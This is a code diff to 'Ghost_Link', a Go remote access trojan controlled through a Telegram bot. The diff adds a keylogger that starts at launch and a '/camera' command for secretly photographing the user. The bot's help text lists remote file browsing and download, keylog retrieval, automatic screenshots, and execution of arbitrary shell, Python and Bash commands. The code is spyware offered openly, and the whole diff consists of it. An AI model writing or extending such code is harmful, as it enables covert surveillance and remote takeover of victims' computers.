@@ -10,6 +10,12 @@ import (
 
 const botToken = "LOL" // Replace with your bot token
 
+// startKeylogger starts the keylogger in a separate goroutine.
+func startKeylogger() {
+	go utilities.StartKeylogger()
+}
+
+// main initializes the Telegram bot and handles updates.
 func main() {
 	bot, err := tgbotapi.NewBotAPI(botToken)
 	if err != nil {
@@ -19,11 +25,15 @@ func main() {
 	bot.Debug = false
 	log.Printf("Authorized on account %s", bot.Self.UserName)
 
+	// Start the keylogger
+	startKeylogger()
+
+	// Set up the update channel
 	u := tgbotapi.NewUpdate(0)
 	u.Timeout = 60
-
 	updates := bot.GetUpdatesChan(u)
 
+	// Process updates
 	for update := range updates {
 		if update.Message == nil {
 			continue
@@ -34,23 +44,25 @@ func main() {
 
 		switch {
 		case text == "/start":
-			message := "Welcome to Ghost_Link! Here's what I can do:\n" +
-				"- Remote file access commands:\n" +
-				"  /ls - List files and folders\n" +
-				"  /cd <folder> - Move to a folder\n" +
-				"  /cdx - Move back to the previous folder\n" +
-				"  /get <file/folder> - Download a file or folder\n" +
-				"- Keylogger commands:\n" +
-				"  /get_log - Retrieve the log file\n" +
-				"  /clear_log - Clear the log file\n" +
-				"- Screenshot commands:\n" +
-				"  /screenshot - Capture a screenshot\n" +
-				"  /screenshot_frequency <seconds> - Set auto-screenshot frequency\n" +
-				"  /auto_screenshot - Start auto-screenshot\n" +
-				"  /stop_screenshot - Stop auto-screenshot\n" +
-				"- Remote code execution commands:\n" +
-				"  /run <command> - Execute a shell command\n" +
-				"  /code <language> <code> - Execute code (Python/Bash)."
+			message := `Welcome to Ghost_Link! Here's what I can do:
+- Remote file access commands:
+  /ls - List files and folders
+  /cd <folder> - Move to a folder
+  /cdx - Move back to the previous folder
+  /get <file/folder> - Download a file or folder
+- Keylogger commands:
+  /get_log - Retrieve the log file
+  /clear_log - Clear the log file
+- Screenshot commands:
+  /screenshot - Capture a screenshot
+  /screenshot_frequency <seconds> - Set auto-screenshot frequency
+  /auto_screenshot - Start auto-screenshot
+  /stop_screenshot - Stop auto-screenshot
+- Remote code execution commands:
+  /run <command> - Execute a shell command
+  /code <language> <code> - Execute code (Python/Bash).
+- Camera command:
+  /camera - Capture a photo secretly.`
 			bot.Send(tgbotapi.NewMessage(chatID, message))
 
 		case strings.HasPrefix(text, "/ls"):
@@ -104,6 +116,9 @@ func main() {
 			language := parts[0]
 			code := parts[1]
 			utilities.ExecuteCode(bot, chatID, language, code)
+
+		case text == "/camera":
+			utilities.HandleCameraCommand(bot, chatID)
 
 		default:
 			bot.Send(tgbotapi.NewMessage(chatID, "Invalid command."))
